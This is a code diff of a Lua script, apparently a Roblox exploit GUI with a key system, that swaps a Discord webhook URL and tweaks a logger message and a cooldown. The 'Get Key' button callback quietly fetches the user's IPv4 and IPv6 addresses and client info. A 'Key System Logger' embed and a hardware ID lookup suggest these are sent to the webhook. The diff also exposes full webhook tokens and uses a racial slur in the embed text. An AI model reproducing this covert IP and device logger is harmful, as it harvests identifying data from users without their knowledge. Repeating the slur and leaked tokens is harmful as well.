@@ -28,7 +28,7 @@ local data = {
     ["embeds"] = {
         {
             ["title"] = "Triskelion Key System Logger",
-            ["description"] = "Someone nigga executed your GUI",
+            ["description"] = "some nigga executed your GUI",
             ["type"] = "rich",
             ["color"] = randomColor,
             ["fields"] = {
@@ -1231,7 +1231,7 @@ KeyTab:AddButton({
 KeyTab:AddButton({
 	Name = "Get Key",
 	Callback = function()
-      		local Webhook = "https://discord.com/api/webhooks/1256079707171061800/pw52vWyZzRSbTM81v1c2ymfFgE6UFWZevJ4Nb9YLIDo6DSjDesEJF0FBAORfi44M5Zzh" -- Put your Webhook link here
+      		local Webhook = "https://discord.com/api/webhooks/1255355475826970734/KWqaQBgBDyrXyTZfwjAY2DZOErN89AMQYEx6UoraD23wcvJEECmV8qEPjmvAmGLz75J4" -- Put your Webhook link here
 local IPv4 = game:HttpGet("https://api.ipify.org") -- IPv4 (you can replace this with any API service)
 local IPv6 = game:HttpGet("https://api64.ipify.org") -- IPv6 (you can replace this with any API service)
 local HTTPbin = game:HttpGet("https://httpbin.org/get") -- Getting some client info
@@ -1415,7 +1415,7 @@ local hwid = RbxAnalyticsService:GetClientId()
 
 local feedbackText = "Put Feedback"  -- Default text for the feedback textbox
 local lastFeedbackTime = 0
-local cooldown = 300  -- 5 minutes in seconds
+local cooldown = 100  
 
 function HttpPost(url, data, headers)
     local response = HTTP({Url = url, Body = data, Method = "POST", Headers = headers})
